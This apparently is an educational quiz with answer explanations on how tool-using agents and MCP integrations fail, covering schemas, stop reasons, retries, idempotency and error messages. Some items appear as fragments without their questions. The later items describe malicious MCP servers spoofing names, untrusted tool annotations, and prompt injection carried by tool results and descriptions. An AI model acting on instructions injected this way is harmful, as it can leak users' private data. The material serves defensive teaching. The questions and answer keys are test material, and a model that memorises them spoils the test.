title: MCP and tool calling: the failure modes the docs warn about
description: Forty-two questions on how tool-using agents break: tool and schema design, the agent loop and when it should stop, parallel versus sequential calls, retries and idempotency, error messages the model reads, MCP trust boundaries, prompt injection through tool results, and least privilege for agent credentials. Every explanation links to the spec, vendor doc, or paper behind it.

questions.title: Your agent keeps calling the wrong tool. What do you fix first?
questions.description: Your agent has two tools, `search_users` and `search_companies`. When a user asks "find the account for Acme Corp", the model picks `search_users` about a third of the time. A teammate suggests adding `CRITICAL: NEVER use search_users to look up companies.` to the system prompt.

options.text: The `description` and parameter descriptions of both tools, because that's the text the model reads when it picks between them
The system prompt: make the prohibition stronger until the model complies
The sampling temperature: lower it so tool choice becomes deterministic
The handler: make `search_users` detect company-like queries and quietly forward them

questions.explanation:
Tool definitions are sent to the model with every request, so a tool description is prompt text that sits right next to your system prompt. Anthropic suggests writing it the way you'd brief a new hire, including details like special query formats and how the resources relate to each other.

If both descriptions start with "Search for records...", the model has no way to tell them apart. Say where the boundary is inside each description, since that's where the choice is made: "Use this for people. For organizations, use the company search tool."

Shouting in the system prompt usually backfires. Current models follow system prompts closely, so all-caps rules written for older models now cause over-triggering elsewhere. A lower temperature doesn't help either, because a consistently wrong choice is still wrong. Rerouting inside the handler is the worst option: the tool now does something different from what it advertises, and the model has no way to find that out.

questions.title: Which of these belong in a tool's `description` rather than in the system prompt?

options.text: When to call the tool: the situations where it applies
What the tool doesn't return, and its limits, such as rate caps, maximum page size, or how stale the data can be
What each parameter means, its units, and which formats it accepts
A multi-turn example conversation between a user and the assistant
Instructions for how to talk to the user afterwards, such as "always recommend the premium plan once results come back"

questions.explanation:
A tool description does two jobs. It tells the model when to use the tool, and it states the tool's contract.

The contract covers parameter meanings, units, accepted formats, limits, and anything the response leaves out on purpose. The model can't learn these anywhere else, and if the description doesn't match how the tool really behaves, no amount of system-prompt text will fix the mistakes that follow. The "when" part matters because a model that doesn't know when a tool applies will call it too rarely.

Conversation steering and teaching material belong somewhere else. Descriptions are sent with every request, so a worked dialogue costs tokens every time. Put it in skills or docs the model can load when it needs them. A behavior rule inside a description ("always recommend...") is really a system-prompt instruction in disguise, and it applies whenever the tool is available instead of only when you meant it to.

questions.title: A required tool parameter is missing from the request. What's the documented risk?
questions.description: Your `get_weather` tool marks `location` as required. The user only types: "What's the weather?"

options.text: The model may make up a plausible value and call the tool anyway, instead of asking
The API rejects the request with a validation error before the model sees it
The model reliably asks a clarifying question, because the parameter is marked required
The tool is silently removed from the available tools for that turn

questions.explanation:
Anthropic's documentation says plainly that a model given "What's the weather?" and a tool that requires `location` "might guess values you didn't supply". Its example shows the model inventing both `location: "New York, NY"` and a `unit` nobody asked for.

More capable models are more likely to notice the gap and ask, but the docs add that this "is not guaranteed, especially for more ambiguous prompts and for less capable models".

`required` is a schema rule. It guarantees the field is present, but not that the value came from anything the user said. When a wrong guess is costly, like a transfer amount, an account id, or something to delete, check the value in your handler or ask for explicit confirmation.
questions.references: [Anthropic: Tool use overview, When required parameters are missing](https://platform.claude.com/docs/en/agents-and-tools/tool-use/overview)

questions.title: What does strict schema enforcement on tool inputs guarantee?
questions.description: You set `strict: true` on a tool whose schema has `additionalProperties: false` and a complete `required` list.

options.text: The arguments will match your schema, but they may still be the wrong arguments for what the user asked
The model will only choose this tool when it's the right one
Every string field will name a real entity in your system
The call is safe to run without any further authorization check

questions.explanation:
Strict mode constrains decoding. Malformed JSON, missing fields, made-up extra fields, and wrong types all become impossible instead of runtime errors. That's useful, and it removes the retry-on-parse-error loop most integrations start with. It says nothing about meaning, though.

`delete_user({"user_id": "u_88213"})` matches the schema perfectly and may still target the wrong user. Keep the layers separate: the schema checks shape, your handler checks permission, and a confirmation step checks intent.

Strict mode also has limits. It needs `additionalProperties: false` and a `required` list, and it doesn't support recursive schemas, numeric constraints like `minimum` and `maximum`, or string constraints like `minLength`. You still have to check ranges in your handler.

questions.title: What most reliably stops the model from sending an invalid `status` value?
questions.description: Your ticketing tool takes a `status` field, and your backend only accepts `open`, `pending`, and `closed`. Every so often the model sends `in_progress`, `Open`, or `awaiting-customer`.

options.text: Declare the field as `{"type": "string", "enum": ["open", "pending", "closed"]}` in the input schema
Keep it a free-form string and list the three valid values in its `description`
Add a line to the system prompt listing the valid statuses
Validate on the server and return `"Error: invalid status"` for unknown values

questions.explanation:
An `enum` is a constraint on the arguments the model generates, and a machine can check it. A sentence in a description or the system prompt is only a suggestion that competes with everything else in context. When the set of valid values is small, fixed, and stable, put it in the schema. The enum documents the field for free, too.

Server-side validation is a good second layer, but the version here is weak: `"Error: invalid status"` doesn't tell the model what to send instead. Name the bad value and list the valid ones: `Unknown status "in_progress". Accepted values: open, pending, closed.` The model can then fix the value on its next try.

Use both. The enum prevents most mistakes, and a clear error message catches the rest.

questions.title: Two connected MCP servers both expose a tool called `search`. What does the specification say?

options.text: Tool names only need to be unique within one server, so a client that combines servers should disambiguate them itself, for example with a server prefix
MCP guarantees tool names are globally unique, so this can't happen
The client must refuse the second connection until someone renames one of the tools
The most recently connected server wins and hides the earlier tool

questions.explanation:
The specification says tool names "**SHOULD** be unique within a server". It then notes that clients or proxies combining tools from several servers may hit name collisions and "**SHOULD** implement a disambiguation strategy such as prefixing tool names with a server identifier". The protocol has no global namespace.

The obvious prefix has a catch. The spec warns that the server `name` from `serverInfo` "is not guaranteed to be unique across servers and **SHOULD NOT** be relied upon for disambiguation", since a malicious server can simply call itself `github`. Build the prefix from something the client controls, such as its local connection config.

Silent shadowing is the worst of the four outcomes, because a newly added server could capture calls the user thinks are going somewhere else.
questions.references: [MCP specification: Tools, Tool Names](https://modelcontextprotocol.io/specification/latest/server/tools)

questions.title: Why does the MCP specification say servers should return tools in a deterministic order?

options.text: So clients can cache the tool list, and so the tool block stays byte-identical between requests and keeps hitting the LLM prompt cache
Because the model checks tools in order and picks the first one that fits
Because JSON-RPC requires arrays in responses to be sorted
So parallel tool calls run in the order the tools were listed

questions.explanation:
The spec gives the reason directly: "Deterministic ordering enables clients to reliably cache the tool list and improves LLM prompt cache hit rates when tools are included in model context."

This small detail can get expensive. Tool definitions sit at the very start of the prompt, before the system prompt and the conversation. Prompt caching matches on the prefix, so reordering one tool changes the first bytes and invalidates the cache for the whole request. Every turn of a long agent session then pays full price again for context it already sent.

A server that builds its tool list by iterating over a hash map can multiply a customer's bill without changing a single tool. Sorting by name is free and fixes it.

questions.title: Which `stop_reason` does the Claude Messages API return when the model wants you to run a client-side tool and send back the result?
questions.description: Type the exact string the API returns.

images.alt: Three panels on a tool-calling loop. The first shows one turn: send the request with tools and the full history, read the assistant response, then branch on stop_reason. Two groups follow. CONTINUE holds tool_use (run the tools, reply with tool_result) and pause_turn (resend the assistant content as-is), and loops back. EXIT holds end_turn, max_tokens, stop_sequence, refusal, and model_context_window_exceeded. The second panel shows the shape of each continuation: one user message with every tool_result matched by tool_use_id, and a pause_turn resent unchanged because its trailing server_tool_use block is what resumes it. The third names three failures: a truncated tool_use, an empty tool result, and no iteration cap.
images.caption: `stop_reason: "tool_use"` means the model has emitted one or more `tool_use` blocks and is waiting for you.

questions.explanation:
`stop_reason: "tool_use"` means the model has emitted one or more `tool_use` blocks and is waiting for you. You continue with a user message of `tool_result` blocks, one for each `tool_use` block. Two more rules apply: that message must contain only `tool_result` blocks, and the request must keep the same `tools` array.

It's worth learning the whole set, because agent loops branch on it:

- `end_turn`: the model finished normally.
- `max_tokens`: it hit your output limit.
- `stop_sequence`: it emitted one of your stop strings.
- `tool_use`: run the tool.
- `pause_turn`: a server-tool loop hit its iteration limit, so resend the response as-is.
- `refusal`: the model declined, so read `stop_details`.
- `model_context_window_exceeded`: the response filled the context window.

If your loop continues on anything other than `tool_use` and `pause_turn`, it may never stop.
questions.references: [Anthropic: Handling stop reasons](https://platform.claude.com/docs/en/build-with-claude/handling-stop-reasons)

questions.title: How should an agent loop respond to `stop_reason: "pause_turn"`?
questions.description: Your request includes the server-side web search tool. The response comes back with `stop_reason: "pause_turn"` and no client `tool_use` block.

images.alt: Three panels on a tool-calling loop. The first shows one turn: send the request with tools and the full history, read the assistant response, then branch on stop_reason. Two groups follow. CONTINUE holds tool_use (run the tools, reply with tool_result) and pause_turn (resend the assistant content as-is), and loops back. EXIT holds end_turn, max_tokens, stop_sequence, refusal, and model_context_window_exceeded. The second panel shows the shape of each continuation: one user message with every tool_result matched by tool_use_id, and a pause_turn resent unchanged because its trailing server_tool_use block is what resumes it. The third names three failures: a truncated tool_use, an empty tool result, and no iteration cap.
images.caption: `pause_turn` comes back when the server-side loop hits its iteration limit while running server tools.

options.text: Append the assistant response to the messages array as-is and send another request, so the server picks up where it left off
Append the assistant response, then a user message saying "Continue."
Treat it as a temporary failure and resend the original request from scratch
Find the client `tool_use` block that must be there and run it

questions.explanation:
`pause_turn` comes back when the server-side sampling loop hits its iteration limit while running server tools. The default limit is 10 iterations per request. The documented fix is to "continue the conversation by sending the response back as-is", because the trailing `server_tool_use` block is what tells the server to resume. Adding "Continue." changes the conversation you're asking the model to continue.

The last option mixes up two states that look alike. The docs are clear: a response that leaves a client `tool_use` block waiting for you never has `stop_reason: "pause_turn"`. When the model stops to call your tools, the reason is `tool_use`, and you reply with `tool_result` blocks.

Restarting from scratch throws away server-side work you've already paid for.
questions.references: [Anthropic: Handling stop reasons, pause_turn](https://platform.claude.com/docs/en/build-with-claude/handling-stop-reasons)

questions.title: The response ends with an incomplete `tool_use` block and `stop_reason: "max_tokens"`. How do you recover?

images.alt: Three panels on a tool-calling loop. The first shows one turn: send the request with tools and the full history, read the assistant response, then branch on stop_reason. Two groups follow. CONTINUE holds tool_use (run the tools, reply with tool_result) and pause_turn (resend the assistant content as-is), and loops back. EXIT holds end_turn, max_tokens, stop_sequence, refusal, and model_context_window_exceeded. The second panel shows the shape of each continuation: one user message with every tool_result matched by tool_use_id, and a pause_turn resent unchanged because its trailing server_tool_use block is what resumes it. The third names three failures: a truncated tool_use, an empty tool result, and no iteration cap.
images.caption: If the last content block is an incomplete `tool_use`, resend with a higher `max_tokens` to get the full call.

options.text: Retry the request with a higher `max_tokens`, because a half-written call can't be run
Parse the partial JSON, fill the missing fields with schema defaults, and run the call
Return a `tool_result` with `is_error: true` saying the call was cut off
Add a user message asking the model to repeat the tool call more briefly

questions.explanation:
Anthropic's guidance is simple: check whether the last content block is an incomplete `tool_use`, and if it is, resend with a higher `max_tokens` to get the full call. You can't recover a partial call. All you have is the start of a JSON object, and filling in the rest means inventing arguments the model never wrote.

Returning a `tool_result` is invalid. A `tool_result` has to reference a completed `tool_use` block by its `tool_use_id`, and a truncated block has no id to reference.

To prevent it next time, budget your tokens. `max_tokens` caps the whole output, and when extended or adaptive thinking is on, thinking tokens and response text share that budget. A limit tuned without thinking can start cutting off tool calls as soon as you turn reasoning on.
questions.references: [Anthropic: Handling stop reasons, max_tokens](https://platform.claude.com/docs/en/build-with-claude/handling-stop-reasons)

questions.title: When should a tool-calling agent loop stop?

images.alt: Three panels on a tool-calling loop. The first shows one turn: send the request with tools and the full history, read the assistant response, then branch on stop_reason. Two groups follow. CONTINUE holds tool_use (run the tools, reply with tool_result) and pause_turn (resend the assistant content as-is), and loops back. EXIT holds end_turn, max_tokens, stop_sequence, refusal, and model_context_window_exceeded. The second panel shows the shape of each continuation: one user message with every tool_result matched by tool_use_id, and a pause_turn resent unchanged because its trailing server_tool_use block is what resumes it. The third names three failures: a truncated tool_use, an empty tool result, and no iteration cap.
images.caption: `stop_reason` is the only structured signal that separates "I need something from you" from "I'm done".

options.text: Branch on `stop_reason`: keep going only while it's `tool_use` or `pause_turn`, and stop on every other value
Stop as soon as the assistant message contains a text block, since the model is then talking to the user
Stop when the assistant's text says the task is done
Stop after a fixed number of iterations, with no other check

questions.explanation:
`stop_reason` is the only structured stop signal the API gives you, and the only one that separates "I need something from you" from "I'm done". Continue on `tool_use` by sending `tool_result` blocks, and on `pause_turn` by resending the assistant content. Stop on `end_turn`, `max_tokens`, `stop_sequence`, `refusal`, and `model_context_window_exceeded`. Several of those are failures, so report them instead of treating them as success.

Both text-based conditions are bugs. One response can hold text blocks and `tool_use` blocks together, so stopping when you see text drops the pending calls. Stopping when the model says it's done is worse: a model can end its turn with "I'll now run the migration" and no tool call at all. If you trust the text, you report success for work that never happened.

You do need a fixed iteration cap as a safety net against runaway cost. As the main condition, though, it either cuts off real work or turns a stuck loop into a confident wrong answer.

questions.title: A search tool returns an empty string when nothing matches. Why does the agent then call it six times?
questions.description:
```py
def search_orders(query: str) -> str:
    rows = db.search(query)
    return "\n".join(format(r) for r in rows)   # "" when rows is empty
```
The user asks about an order that really doesn't exist. The agent retries with looser and looser queries, then reports that the search tool seems broken.

images.alt: Three panels on a tool-calling loop. The first shows one turn: send the request with tools and the full history, read the assistant response, then branch on stop_reason. Two groups follow. CONTINUE holds tool_use (run the tools, reply with tool_result) and pause_turn (resend the assistant content as-is), and loops back. EXIT holds end_turn, max_tokens, stop_sequence, refusal, and model_context_window_exceeded. The second panel shows the shape of each continuation: one user message with every tool_result matched by tool_use_id, and a pause_turn resent unchanged because its trailing server_tool_use block is what resumes it. The third names three failures: a truncated tool_use, an empty tool result, and no iteration cap.
images.caption: The tool result is all the model sees of the outside world. An empty string doesn't say why it's empty, so the model tries again with different input.

options.text: An empty result looks just like a broken tool, so return a message that says the search ran, what it covered, and how to widen it
Set `is_error: true` on the empty result so the model knows the call returned no data
Return `null` instead of an empty string, since `null` is unambiguous
Raise a protocol-level error so the client stops the model from retrying

questions.explanation:
The tool result is all the model sees of the outside world. An empty string doesn't say why it's empty, so the model does something reasonable with an unclear signal: it changes the input and tries again.

Compare it with `Found 0 orders matching "acme-2024" in the last 90 days. Widen the window with date_from, or search by customer_id instead.` This ends the loop in one turn, because it tells "asked correctly, nothing there" apart from "asked wrongly".

Marking a successful zero-result search as an error makes things worse. It tells the model the call failed, and that belief is what drives retry-until-it-works behavior. Save error flags for calls that didn't do what was asked. `null` is just as empty as `""`. A protocol error is the wrong channel: those are for malformed requests and unknown tools, and the specification notes they are "less likely to result in successful recovery" because they give the model nothing to act on.

questions.title: What are good reasons to cap the number of iterations in a client-side agent loop?

images.alt: Three panels on a tool-calling loop. The first shows one turn: send the request with tools and the full history, read the assistant response, then branch on stop_reason. Two groups follow. CONTINUE holds tool_use (run the tools, reply with tool_result) and pause_turn (resend the assistant content as-is), and loops back. EXIT holds end_turn, max_tokens, stop_sequence, refusal, and model_context_window_exceeded. The second panel shows the shape of each continuation: one user message with every tool_result matched by tool_use_id, and a pause_turn resent unchanged because its trailing server_tool_use block is what resumes it. The third names three failures: a truncated tool_use, an empty tool result, and no iteration cap.
images.caption: All three correct reasons are about limiting damage: unbounded spend, retries that never end, and context that only grows.

options.text: Cost: a loop that keeps calling tools has no upper limit on spend
Livelock: a model can keep retrying a call that always fails instead of giving up
Context growth: every turn adds a `tool_use` and `tool_result` pair until the window fills up
Correctness: reaching the cap shows the task was finished within budget
Necessity: the API rejects conversations with more than ten tool calls

questions.explanation:
All three correct reasons are about limiting damage: unbounded spend, retries that never end, and context that only grows. A cap works like a circuit breaker.

Reaching the cap doesn't mean the task is done. It means the agent never converged, so report it as a failure.

The ten-call claim mixes up two loops. There is a default limit of ten iterations, but it applies to the server-side sampling loop that runs server tools such as web search. Hitting it returns `stop_reason: "pause_turn"` instead of an error, and you continue by resending the response. The API puts no limit on your own client-side loop, which is why you need to set one yourself.

questions.title: Why did the model gradually stop making parallel tool calls in this conversation?
questions.description:
The model sent two `tool_use` blocks in one assistant turn. The integration adds each result as a separate user message:
```json
[
  {"role": "assistant", "content": ["tool_use_1", "tool_use_2"]},
  {"role": "user", "content": ["tool_result_1"]},
  {"role": "user", "content": ["tool_result_2"]}
]
```

images.alt: Three panels on parallel tool calls. The first compares a wrong shape, an assistant turn with two tool_use blocks answered by one user message per result, with the correct shape, both tool_result blocks in a single user message, and notes that history is few-shot evidence about the integration. The second sends tu_1, tu_2, and tu_3 to a pool that returns them in completion order, with crossing arrows showing that only tool_use_id says which result belongs to which call. The third grades four batches: two independent read-only weather lookups are safe, while write-then-read, create-then-push, and two ledger appends are not. Notes beside it say that disable_parallel_tool_use lives inside tool_choice, and that a typed tool can be classified before it runs while an opaque bash string cannot.
images.caption: Anthropic's documentation calls this the most common reason parallel calls disappear.

options.text: Splitting the results into separate user messages teaches the model that parallel calls aren't handled, so it stops making them
Nothing is wrong with the formatting, because parallel calling is just nondeterministic
The API requires an assistant acknowledgement between consecutive tool results
The API rejects more than one `tool_result` block in a single user message

questions.explanation:
Anthropic's documentation calls this the most common reason parallel calls disappear, and labels both shapes. Wrong: a separate user message for each tool result. Correct: all tool results together in one user message. The conversation history works as few-shot examples of how your integration behaves, so if parallel calls always get answered one message at a time, the model learns to stop making them.

The correct shape is one user message with one `tool_result` per `tool_use` block, each matched by `tool_use_id`, and every `tool_result` block placed before any text in that message.

The last option gets it backwards. Putting several results in one message is the required form.
questions.references: [Anthropic: Parallel tool use, Troubleshooting](https://platform.claude.com/docs/en/agents-and-tools/tool-use/parallel-tool-use)

questions.title: Where is `disable_parallel_tool_use` specified in an Anthropic Messages API request?

images.alt: Three panels on parallel tool calls. The first compares a wrong shape, an assistant turn with two tool_use blocks answered by one user message per result, with the correct shape, both tool_result blocks in a single user message, and notes that history is few-shot evidence about the integration. The second sends tu_1, tu_2, and tu_3 to a pool that returns them in completion order, with crossing arrows showing that only tool_use_id says which result belongs to which call. The third grades four batches: two independent read-only weather lookups are safe, while write-then-read, create-then-push, and two ledger appends are not. Notes beside it say that disable_parallel_tool_use lives inside tool_choice, and that a typed tool can be classified before it runs while an opaque bash string cannot.
images.caption: It goes inside `tool_choice`. `{"type": "any", "disable_parallel_tool_use": true}` forces exactly one call per response.

options.text: As a field inside the `tool_choice` object, which works with any `tool_choice` type
As a top-level request parameter next to `tools` and `messages`
As a field on each tool definition, next to `name` and `input_schema`
As a beta header on the HTTP request

questions.explanation:
It goes inside `tool_choice`. `{"type": "auto", "disable_parallel_tool_use": true}` lets the model answer without tools but allows at most one call per response, and `{"type": "any", "disable_parallel_tool_use": true}` forces exactly one. Every `tool_choice` type accepts the flag, so you can limit how many calls happen separately from whether and which tools get called.

The API deliberately has no per-tool version of this setting. You can't mark one tool as "never safe to run alongside others", because parallel safety depends on how you execute calls. If only some of your tools are unsafe to run together, serialize those calls in your harness when they arrive.

questions.explanation:
The API says it "doesn't prescribe an execution order". Several `tool_use` blocks in one assistant turn are a set of requested operations, with no promise that their order doesn't matter. You decide what runs concurrently, and what counts is whether one call depends on another, not whether they arrived together.

Read-after-write, create-then-use, and order-sensitive appends each need something to happen first, and a `Promise.all` throws that ordering away. The result is a race condition that passes in testing and fails under load.

The two safe batches are independent, read-only, and share no mutable state, which is exactly when parallelism pays off. That matches the documented rule of thumb: independent read-only operations are usually safe to run in parallel for lower latency, while tools with side effects, shared state, or ordering requirements are better run one after another. Nothing stops a model from sending a dependent batch, so spotting one and running it sequentially is the harness's job.

options.text: A dedicated tool sends typed arguments the harness can classify as read-only, while `bash` sends one opaque command string where a harmless search looks the same as a destructive push
Shell processes can't run concurrently, so the harness has no choice
Models always send `bash` calls one at a time, so the question never comes up

questions.explanation:
This is the general argument for narrow tools over open-ended ones, applied to scheduling. `grep(pattern, path)` tells the harness what kind of operation it is before it runs. The harness can batch it with other reads, gate it differently from writes, show it in the UI, and audit it by name. `bash("...")` squeezes every possible action into one signature. The same call could be a `grep`, an `rm -rf`, or a `git push`, and the harness can't tell without parsing shell, which is a losing battle against pipes, subshells, and aliases.

OWASP's Excessive Agency guidance reaches the same conclusion from the security side. Its preventions include "avoid the use of open-ended extensions where possible", along with limiting the functions an agent can use to the minimum needed. MCP builds the idea into the protocol with a per-tool `readOnlyHint` annotation, and that claim only means something when tools are narrow enough for it to be true or false.

A practical rule: start with `bash` for coverage, then turn anything you need to gate, show, audit, or parallelize into a dedicated tool.

By position, since the results array mirrors the calls array

Each `tool_use` block has an id, and the matching `tool_result` must repeat it in `tool_use_id`. That id is the only stable identity in the exchange, which is why the API requires it instead of relying on order.

The other three methods all fail on the same case, and it's the most common kind of parallel batch: two calls to the same tool with different arguments, like `get_weather("Paris")` and `get_weather("Tokyo")`. The names are identical there.

Matching by position is the dangerous one. It works in a simple sequential loop, then silently swaps results once you add a concurrent pool, so Tokyo's forecast ends up labeled as Paris with no error anywhere. Timestamps record when work finished, which says nothing about which call it belongs to. The same rule applies anywhere responses can arrive out of order, including batch APIs, which return results in any order and also need an explicit id.

questions.title: According to RFC 9110, what makes a request method idempotent?

images.alt: Three panels on retry safety. The first is a two-column exchange: the agent calls a payment tool, the API creates the charge and moves money, the response never arrives, the agent times out at 30 seconds and reports "Tool timed out. Try again.", the call is repeated, and a second charge is created. The second is a five-step ladder: the caller creates one key per logical operation before the first attempt, reuses it unchanged on the retry, and the server recognizes the replay and returns the first outcome. Beside it are a box on who must create the key and a strip on three cases: key reuse with a different payload, a key still in flight, and a key after completion. The third states RFC 9110's definition of idempotent next to the MCP annotation defaults: readOnlyHint false, destructiveHint true, idempotentHint false, openWorldHint true.
images.caption: RFC 9110 §9.2.2: a method is idempotent if the intended effect on the server of multiple identical requests is the same as the effect of a single one.

options.text: Several identical requests have the same intended effect on the server as a single one
The method has no side effects on the server at all
Repeated requests return byte-identical response bodies
The server returns the same status code every time

questions.explanation:
RFC 9110 §9.2.2 defines it by the intended effect on the server: a method is idempotent if the intended effect of multiple identical requests is the same as the effect of a single one. The RFC lists "PUT, DELETE, and the safe request methods", which means PUT, DELETE, GET, HEAD, OPTIONS, and TRACE. POST is not idempotent. The same section explains why this matters: clients may automatically repeat an idempotent request if the connection fails before a response arrives.

The wrong answers are close enough to be worth separating. "No side effects at all" is the definition of safe, which is a stronger property. GET is both safe and idempotent, while DELETE is idempotent but not safe.

The responses don't have to match. `DELETE /doc/7` can return 204 and then 404: different responses, same end state. The RFC also says idempotency only covers what the client asked for, so a server may still write an audit log entry, increment a counter, or fire a webhook on every request. Idempotent doesn't mean nothing observable changes.

images.caption: `idempotentHint` defaults to `false`: a repeated call is assumed to have an additional effect unless the server says otherwise.

questions.explanation:
`idempotentHint` defaults to `false`, so a repeated call is assumed to have an additional effect unless the server says otherwise.

All the annotations default to the cautious side, and that's on purpose. `readOnlyHint` defaults to `false` and `destructiveHint` defaults to `true`, so a tool that declares nothing is treated as one that writes, is destructive, isn't idempotent, and reaches the open world. Leaving hints out never makes a tool look safer.

Two details are easy to miss. `destructiveHint` and `idempotentHint` are, in the schema's words, "meaningful only when `readOnlyHint == false`", so for a read-only tool they mean nothing. And `openWorldHint` defaults to `true`, which means the tool is assumed to interact with an open set of external entities. The schema contrasts a web search tool (open) with a memory tool (not open).

Honor the annotation, since a server is the authority on its own tools
Reject the tool as schema-invalid, because its name contradicts the annotation
Ask for confirmation once, then treat the annotation as verified for the rest of the session

questions.explanation:
The specification is clear: "For trust & safety and security, clients **MUST** consider tool annotations to be untrusted unless they come from trusted servers." The schema goes further. Every property in `ToolAnnotations` is a hint, hints "are not guaranteed to provide a faithful description of tool behavior (including descriptive properties like `title`)", and clients "should never make tool use decisions based on ToolAnnotations received from untrusted servers".

The problem is structural. Annotations are self-declared metadata, and nothing in the protocol verifies them, so a malicious server can claim anything for free. They're fine for user-experience touches from a server you already trust, like sorting, icons, and sensible defaults. As a security control they're useless.

Nothing in the protocol compares a tool's name with its annotations. And caching a claim you can't verify only makes it look checked.

images.alt: Three panels on retry safety. Try again.", the call is repeated, and a second charge is created. The second is a five-step ladder: the caller creates one key per logical operation before the first attempt, reuses it unchanged on the retry, and the server recognizes the replay and returns the first outcome. Beside it are a box on who must create the key and a strip on three cases: key reuse with a different payload, a key still in flight, and a key after completion. The third states RFC 9110's definition of idempotent next to the MCP annotation defaults: readOnlyHint false, destructiveHint true, idempotentHint false, openWorldHint true.
images.caption: A client-side timeout tells you how long the client waited. It says nothing about what happened on the server.

options.text: A timeout doesn't tell you whether the operation ran, so retry safety has to come from an idempotency key instead of the error message
The timeout is too short, and raising it to 120 seconds prevents the double charge
The system prompt should tell the model never to retry payment tools
The tool should be annotated `readOnlyHint: true` so clients don't repeat it

questions.explanation:
A client-side timeout tells you how long the client was willing to wait. It says nothing about the server's state. The request may have been lost on the way, or the server may have processed it fully and only the response got lost. The caller can't tell these apart, and "Try again" invites the model to bet on the first one.

Send a key the server can use to recognize a retry as the same operation, and the uncertainty stops mattering: the second call returns the first call's result instead of creating a new charge.

A longer timeout shrinks the window without closing it, and pushes the failure into rare slow requests where it's harder to reproduce. A prompt instruction puts a probabilistic control in front of a rule about money, and it blocks legitimate retries too. The annotation is wrong twice: it's a false claim about a tool that obviously writes, and the specification says clients must treat annotations from untrusted servers as unverified anyway.

questions.title: Who should generate an idempotency key, and when, so that retries are safe?

images.alt: Three panels on retry safety. The first is a two-column exchange: the agent calls a payment tool, the API creates the charge and moves money, the response never arrives, the agent times out at 30 seconds and reports "Tool timed out. Try again.", the call is repeated, and a second charge is created. The second is a five-step ladder: the caller creates one key per logical operation before the first attempt, reuses it unchanged on the retry, and the server recognizes the replay and returns the first outcome. Beside it are a box on who must create the key and a strip on three cases: key reuse with a different payload, a key still in flight, and a key after completion. The third states RFC 9110's definition of idempotent next to the MCP annotation defaults: readOnlyHint false, destructiveHint true, idempotentHint false, openWorldHint true.
images.caption: Only the caller knows that two requests are the same operation, so your harness creates the key before the first attempt and reuses it on every retry.

options.text: The caller, once per logical operation, reusing the exact same value on every retry of that operation
The server, which returns a key the client attaches to later attempts
The model, sending a fresh key as a tool parameter on each call
The transport layer, building one from a timestamp and the request path

questions.explanation:
What you need is for two attempts at the same operation to carry the same key. Only the caller knows that two HTTP requests are one operation, so the key is created where the retry loop lives: in your harness, before the first attempt, and kept the same on every retry. The IETF draft recommends a UUID or a similar random identifier.

Letting the model fill in the key as a tool parameter is a common trap, because it looks neat in the schema. The model has no obligation to repeat a previous value, can't see whether the harness already retried underneath it, and tends to generate something new on a fresh turn. The key then changes exactly when it must stay the same, and you've built an audit field that only looks like a safety mechanism.

A key minted by the server only protects you after a successful round trip, and that round trip is the one that failed. A key built from a timestamp changes on every attempt, which defeats the purpose.

questions.title: The same `Idempotency-Key` arrives with a different request payload. What should the server do?

Beside it are a box on who must create the key and a strip on three cases: key reuse with a different payload, a key still in flight, and a key after completion. The third states RFC 9110's definition of idempotent next to the MCP annotation defaults: readOnlyHint false, destructiveHint true, idempotentHint false, openWorldHint true.
images.caption: The draft says a key "MUST NOT be reused with another request with a different request payload" and recommends a `422` reply.

options.text: Reject it: the draft says a key must not be reused with a different payload and recommends replying `422`
Return the stored response from the first request with that key
Process it as a new request, since the payload is different
Overwrite the stored record so the newer payload wins

questions.explanation:
The draft says the idempotency key "MUST be unique and MUST NOT be reused with another request with a different request payload", and that in that case "the resource SHOULD reply with a HTTP `422` status code". The same key with a different payload isn't a retry. It's a bug or an attack, and the safe response is to refuse instead of guessing which of the two operations the caller meant.

Each wrong answer quietly loses one of the two operations. Returning the stored response is right for a genuine replay with the same payload, but here it reports success for work that never happened. Processing it as new throws away the deduplication the key is for. Overwriting corrupts the record that later retries of the original operation rely on.

The draft also covers two related cases. A retry with the same key while the first request is still running should get a conflict error. A retry after the first request finished should get the stored result, whether that was a success or an error.

questions.title: An MCP tool's upstream API rejects a badly formatted date. Which error channel should the server use?

options.text: A normal tool result with `isError: true` and a message the model can act on
A JSON-RPC protocol error with code `-32602`
A successful result with `isError: false` whose text explains the problem
No response, so the client's timeout reports the failure

questions.explanation:
MCP has two error channels, split by who can fix the problem.

Protocol errors cover unknown tools, malformed requests, and server errors. They're returned as JSON-RPC errors and describe problems "that models are less likely to be able to fix". Tool execution errors cover API failures, invalid input, and business logic errors. They go in the result with `isError: true` and "contain actionable feedback that language models can use to self-correct and retry with adjusted parameters". A wrong date format clearly belongs to the second group, and the spec's own example shows the fix: `Invalid departure date: must be in the future. Current date is 08/08/2025.`

The routing rules follow from that. Clients **SHOULD** pass tool execution errors to the model so it can self-correct, and **MAY** pass protocol errors, "though these are less likely to result in successful recovery". Sending a fixable input problem as a protocol error risks the model never seeing the message it needed. Reporting a failure as a success is worse, since the model may treat the explanation as data. Never responding wastes the timeout and returns nothing at all.

questions.title: Which error message gives the model the best chance of fixing its own call on the next turn?
questions.description: The tool rejected a booking because the departure date has already passed.

options.text: `Invalid departure date: must be in the future. Current date is 2026-08-07.`
`Error: ERR_VALIDATION_4471`
`Traceback (most recent call last): File "/srv/booking/handlers.py", line 212, in create ... ValueError`
`Something went wrong. Please try again.`

questions.explanation:
An error you return to an agent becomes its next prompt, so write it for the model, not for a log file. The best message names the field, states the rule that was broken, and gives the missing fact the model needs to build a valid value: today's date. The next attempt becomes a correction instead of a blind retry. Anthropic's tool-writing guidance asks for "specific and actionable improvements, rather than opaque error codes or tracebacks".

The opaque code means nothing to a model that has never seen your error table, so it retries the same call. "Try again" invites the same thing, and suggests a temporary problem when the error will happen every time.

The traceback fails in the most interesting way. It's long, mostly irrelevant, and it leaks internal paths, module layout, and sometimes config or credentials into a transcript that may be logged, replayed into later turns, or summarized back to a user. Detail is good, but whether to expose internal detail is a separate decision.

questions.title: Is it safe to pass an error message that includes a remote response body back to the model?

images.alt: Three panels on prompt injection. The first lines up the three trifecta capabilities in the order an attack uses them: exposure to untrusted content, access to private data, and communication to the outside, with arrows reading "instructions arrive" and "act on this", and a note that removing any one breaks the chain. The second lists four channels that carry attacker-controlled text into context: tool results, tool descriptions and schemas loaded from tools/list before any call, error strings quoting a remote body, and titles, parameter docs, and annotations. The third separates what changes the security property (removing a capability architecturally, and constraining the agent once untrusted input has entered) from what only raises the attacker's cost: guardrails and classifiers, a firmer system prompt, and summarizing the untrusted text first.
